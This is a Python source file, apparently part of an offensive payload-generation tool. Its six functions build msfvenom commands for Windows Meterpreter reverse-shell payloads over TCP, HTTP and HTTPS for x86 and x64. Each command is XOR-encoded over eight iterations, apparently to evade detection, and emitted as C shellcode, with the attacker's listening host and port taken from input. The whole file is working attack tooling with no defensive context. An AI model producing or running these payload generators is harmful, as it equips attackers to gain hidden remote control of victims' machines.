from lib import core

def x86_Win_Met_Rev_TCP():
    LHOST = LHOST_Input()
    LPORT = LPORT_Input()
    MSFVENOM = ("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=" + LHOST + " lport=" + LPORT + " -e x86/xor_dynamic -i 8 -f c")
    return MSFVENOM


def x86_Win_Met_Rev_HTTP():
    LHOST = LHOST_Input()
    LPORT = LPORT_Input()
    MSFVENOM = ("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http lhost=" + LHOST + " lport=" + LPORT + " -e x86/xor_dynamic -i 8 -f c")
    return MSFVENOM


def x86_Win_Met_Rev_HTTPS():
    LHOST = LHOST_Input()
    LPORT = LPORT_Input()
    MSFVENOM = ("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https lhost=" + LHOST + " lport=" + LPORT + " -e x86/xor_dynamic -i 8 -f c")
    return MSFVENOM


def x64_Win_Met_Rev_TCP():
    LHOST = LHOST_Input()
    LPORT = LPORT_Input()
    MSFVENOM = ("msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=" + LHOST + " lport=" + LPORT + " -e x64/xor_dynamic -i 8 -f c")
    return MSFVENOM


def x64_Win_Met_Rev_HTTP():
    LHOST = LHOST_Input()
    LPORT = LPORT_Input()
    MSFVENOM = ("msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_http lhost=" + LHOST + " lport=" + LPORT + " -e x64/xor_dynamic -i 8 -f c")
    return MSFVENOM


def x64_Win_Met_Rev_HTTPS():
    LHOST = LHOST_Input()
    LPORT = LPORT_Input()
    MSFVENOM = ("msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_https lhost=" + LHOST + " lport=" + LPORT + " -e x64/xor_dynamic -i 8 -f c")
    return MSFVENOM


def LHOST_Input():
    LHOST = input("Enter you LHOST : ")
    return  LHOST


def LPORT_Input():
    LPORT = input("Enter you LPORT : ")
    return LPORT